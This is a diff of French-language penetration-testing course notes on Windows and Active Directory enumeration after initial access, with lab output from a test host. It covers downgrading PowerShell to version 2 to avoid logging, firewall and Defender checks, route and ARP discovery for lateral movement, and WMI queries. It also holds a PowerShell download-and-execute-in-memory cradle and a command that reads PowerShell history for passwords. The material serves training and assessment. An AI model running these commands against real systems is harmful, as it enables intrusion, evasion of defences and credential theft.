@@ -1414,3 +1414,230 @@ Voici quelques-unes des façons dont PowerShell peut nous aider.
 | `Get-ChildItem Env: I ft Key,Value` | Retourne les valeurs d'environnement telles que les chemins clés, les utilisateurs, les informations sur l'ordinateur, etc. |
 | `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Avec cette commande, nous pouvons obtenir l'historique PowerShell de l'utilisateur spécifié. Cela peut être très utile car l'historique des commandes peut contenir des mots de passe ou nous orienter vers des fichiers de configuration ou des scripts contenant des mots de passe. |
 | `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL pour télécharger le fichier'); <commandes suivantes>"` | C'est un moyen rapide et facile de télécharger un fichier depuis le web en utilisant PowerShell et de l'appeler depuis la mémoire. |
+
+### Downgrade Powershell
+
+```
+PS C:\htb> Get-host
+
+Name             : ConsoleHost
+Version          : 5.1.19041.1320
+InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
+UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
+CurrentCulture   : en-US
+CurrentUICulture : en-US
+PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
+DebuggerEnabled  : True
+IsRunspacePushed : False
+Runspace         : System.Management.Automation.Runspaces.LocalRunspace
+
+PS C:\htb> powershell.exe -version 2
+Windows PowerShell
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+
+PS C:\htb> Get-host
+Name             : ConsoleHost
+Version          : 2.0
+InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
+UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
+CurrentCulture   : en-US
+CurrentUICulture : en-US
+PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
+IsRunspacePushed : False
+Runspace         : System.Management.Automation.Runspaces.LocalRunspace
+
+PS C:\htb> get-module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
+Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
+```
+
+### Firewall Checks
+
+```
+PS C:\htb> netsh advfirewall show allprofiles
+
+Domain Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Private Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Public Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+```
+
+### Windows Defender Check (from CMD.exe) 
+
+```
+C:\htb> sc query windefend
+
+SERVICE_NAME: windefend
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+### Get-MpComputerStatus
+
+```
+PS C:\htb> Get-MpComputerStatus
+
+AMEngineVersion                  : 1.1.19000.8
+AMProductVersion                 : 4.18.2202.4
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.2202.4
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 0
+AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
+AntispywareSignatureVersion      : 1.361.414.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 0
+AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
+AntivirusSignatureVersion        : 1.361.414.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+DeviceControlDefaultEnforcement  : Unknown
+DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
+DeviceControlState               : Disabled
+FullScanAge                      : 4294967295
+FullScanEndTime                  :
+FullScanOverdue                  : False
+FullScanRequired                 : False
+FullScanSignatureVersion         :
+FullScanStartTime                :
+IoavProtectionEnabled            : True
+IsTamperProtected                : True
+IsVirtualMachine                 : False
+LastFullScanSource               : 0
+LastQuickScanSource              : 2
+
+<SNIP>
+```
+
+### Informations Réseau
+
+#### Commandes Réseau
+
+| Commande | Description |
+|----------|-------------|
+| `arp -a` | Liste tous les hôtes connus stockés dans la table arp. |
+| `ipconfig /all` | Affiche les paramètres des adaptateurs pour l'hôte. Nous pouvons déterminer le segment de réseau à partir de là. |
+| `route print` | Affiche la table de routage (IPv4 & IPv6) identifiant les réseaux connus et les routes de couche trois partagées avec l'hôte. |
+| `netsh advfirewall show allprofiles` | Affiche l'état du pare-feu de l'hôte. Nous pouvons déterminer s'il est actif et s'il filtre le trafic. |
+
+Des commandes telles que `ipconfig /all` et `systeminfo` nous montrent quelques configurations réseau de base. Deux autres commandes importantes nous fournissent une tonne de données précieuses et pourraient nous aider à approfondir notre accès. `arp -a` et `route print` nous montreront quels hôtes la machine sur laquelle nous sommes est au courant et quels réseaux sont connus de l'hôte. Tous les réseaux qui apparaissent dans la table de routage sont des avenues potentielles pour un mouvement latéral car ils sont suffisamment accessibles pour qu'une route ait été ajoutée, ou ils ont été administrativement définis là pour que l'hôte sache comment accéder aux ressources sur le domaine. Ces deux commandes peuvent être particulièrement utiles dans la phase de découverte d'une évaluation en boîte noire où nous devons limiter notre balayage.
+
+
+```powershell
+PS C:\htb> route print
+
+===========================================================================
+Interface List
+  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
+ 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
+  1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
+          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
+       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
+   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
+   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
+      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
+     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
+        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
+  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
+  ===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0       172.16.5.1  Default
+===========================================================================
+
+IPv6 Route Table
+===========================================================================
+```
+
+L’utilisation des commandes arp -a et route print ne bénéficiera pas seulement à l’énumération des environnements AD, mais nous aidera également à identifier les opportunités de pivot vers différents segments de réseau dans n’importe quel environnement. Ce sont des commandes que nous devrions envisager d’utiliser à chaque engagement pour aider nos clients à comprendre où un attaquant pourrait tenter d’aller après une compromission initiale.
+
+
+### Windows Management Instrumentation (WMI)
+
+Windows Management Instrumentation (WMI) est un moteur de script largement utilisé dans les environnements d'entreprise Windows pour récupérer des informations et exécuter des tâches administratives sur des hôtes locaux et distants. Pour notre utilisation, nous allons créer un rapport WMI sur les utilisateurs de domaine, les groupes, les processus et d'autres informations de notre hôte et d'autres hôtes de domaine.
+
+#### Vérifications rapides WMI
+
+| Commande | Description |
+|----------|-------------|
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Affiche le niveau de correctif et la description des correctifs appliqués |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Affiche les informations de base de l'hôte, y compris les attributs de la liste |
+| `wmic process list /format:list` | Liste de tous les processus sur l'hôte |
+| `wmic ntdomain list /format:list` | Affiche des informations sur le domaine et les contrôleurs de domaine |
+| `wmic useraccount list /format:list` | Affiche des informations sur tous les comptes locaux et tous les comptes de domaine qui se sont connectés à l'appareil |
+| `wmic group list /format:list` | Informations sur tous les groupes locaux |
+| `wmic sysaccount list /format:list` | Affiche des informations sur tous les comptes système utilisés comme comptes de service |
+
+
